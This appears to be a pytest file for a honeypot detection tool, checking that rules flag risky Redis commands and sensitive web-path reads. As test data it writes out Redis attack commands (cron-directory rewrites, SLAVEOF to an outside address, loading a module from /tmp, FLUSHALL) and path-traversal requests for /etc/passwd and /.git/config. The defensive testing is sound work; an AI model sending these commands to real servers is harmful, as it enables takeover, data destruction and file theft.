"""R11 data-store abuse, R8 staying SSH-only, and the wider R9 sensitive-path list."""

from __future__ import annotations

import pytest
from helpers import banner_visits, finding_for, hits_of, run, web

from decoys import honeytokens
from qlure.events import Service


def _redis(ip, lines, auth=False):
    payload = b""
    if auth:
        payload += b"AUTH " + honeytokens.get("ht-redis-001")["value"].encode() + b"\r\n"
    payload += b"".join(line.encode() + b"\r\n" for line in lines)
    banner_visits(ip, [Service.REDIS], payload)


@pytest.mark.parametrize(
    "command",
    [
        "config set dir /var/spool/cron",
        "SLAVEOF 203.0.113.9 6379",
        "REPLICAOF NO ONE",
        "module load /tmp/x.so",
        "EVAL return 1 0",
        "EVALSHA abc 0",
        "FLUSHALL",
        "flushdb",
        "DEBUG sleep 0",
        "SCRIPT FLUSH",
    ],
)
def test_single_risky_redis_command_is_at_least_suspicious(read_events, command):
    ip = "198.51.100.171"
    _redis(ip, [command])
    finding = finding_for(run(read_events), ip, "redis")
    assert "R11" in hits_of(finding)
    assert finding.score >= 30 and finding.verdict in ("Suspicious", "Noteworthy")


def test_plain_redis_commands_do_not_fire_r11(read_events):
    ip = "198.51.100.172"
    _redis(ip, ["PING", "INFO", "GET foo"])
    assert "R11" not in hits_of(finding_for(run(read_events), ip, "redis"))


def test_redis_session_fires_r11_not_r8(read_events):
    ip = "198.51.100.173"
    _redis(ip, ["CONFIG SET dir /etc/cron.d", "SET x wget", "ls", "whoami", "id", "curl x"])
    hits = hits_of(finding_for(run(read_events), ip, "redis"))
    assert "R11" in hits and "R8" not in hits


def test_r11_with_planted_auth_is_noteworthy_and_labelled(read_events):
    ip = "198.51.100.174"
    _redis(ip, ["CONFIG SET dir /x", "MODULE LOAD /tmp/x.so", "EVAL 1 0"], auth=True)
    finding = finding_for(run(read_events), ip, "redis")
    assert {"R7", "R11"} <= hits_of(finding) and finding.verdict == "Noteworthy"
    hit = next(h for h in finding.hits if h.rule_id == "R11")
    assert {"T1190", "T1059"} <= set(hit.attack)


@pytest.mark.parametrize("path", ["/.git/config", "/download?file=../../../etc/passwd"])
def test_r9_fires_on_git_and_passwd_reads(read_events, path):
    ip = "198.51.100.175"
    web(ip).get(path)
    assert "R9" in hits_of(finding_for(run(read_events), ip, "web"))
